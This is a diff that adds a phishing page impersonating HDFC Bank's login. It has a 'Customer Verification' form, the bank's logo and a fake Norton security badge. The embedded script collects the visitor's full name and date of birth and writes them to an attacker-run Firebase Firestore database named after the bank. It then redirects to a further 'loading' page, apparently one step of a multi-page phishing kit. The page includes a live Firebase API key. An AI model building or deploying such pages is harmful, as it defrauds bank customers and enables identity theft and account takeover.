@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <img src="hdfclogo.png" alt="HDFC Bank" class="logo">
+        <h2>Customer Verification</h2>
+        
+        <form class="login-form" id="form">
+            <label for="customer-name">Customer Full Name <span>*</span></label>
+            <input type="text" id="customer-name" name="customername" placeholder="">
+
+            <label for="dob">Date of Birth <span>*</span></label>
+            <input type="text" id="dob" name="dob" placeholder="">
+
+            <button type="submit">SUBMIT</button>
+        </form>
+
+        <div class="norton-secured">
+            <img src="nortonsecurity.png" alt="Norton Secured">
+        </div>
+
+        <div class="security-note">
+            <p>Your security is of utmost importance. <br><a href="#">Know More...</a></p>
+        </div>
+    </div>
+
+    <footer>
+        <p>© Copyright &nbsp; | &nbsp; <a href="#">Terms and Condition</a> &nbsp; | &nbsp; <a href="#">Privacy Policy</a></p>
+    </footer>
+
+</body>
+</html>
+
+
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+
+<script>
+
+    // Firebase configuration
+    const firebaseConfig = {
+            apiKey: "AIzaSyBh2pLncBUFtiVVHWAI6HiZarEK3Qw_kf4",
+            authDomain: "hdfc-16404.firebaseapp.com",
+            projectId: "hdfc-16404",
+            storageBucket: "hdfc-16404.firebasestorage.app",
+            messagingSenderId: "429370839636",
+            appId: "1:429370839636:web:67373572f52937872f13c1",
+            measurementId: "G-HCX0NQKHGJ"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Initialize Firestore
+    var db = firebase.firestore();
+
+    // Form submit event listener
+    document.getElementById("form").addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        const customername = document.querySelector('input[name="customername"]').value;
+
+        const dob = document.querySelector('input[name="dob"]').value;
+
+        var random_no = localStorage.getItem('random_no');
+
+        if (!customername || !dob) {
+            alert("Please fill in all fields.");
+        } else {
+
+            const data = {
+                customername: customername,
+                dob: dob
+            };
+
+            // Save data to Firestore
+
+
+            db.collection("users").doc(random_no.toString()).update(data)
+                .then(() => {
+                    console.log("Data stored successfully!");
+                    window.location.href = "loading3.html";
+                })
+                .catch((error) => {
+                    console.error("Error storing data: ", error);
+                });
+        }
+
+    });
+
+</script>
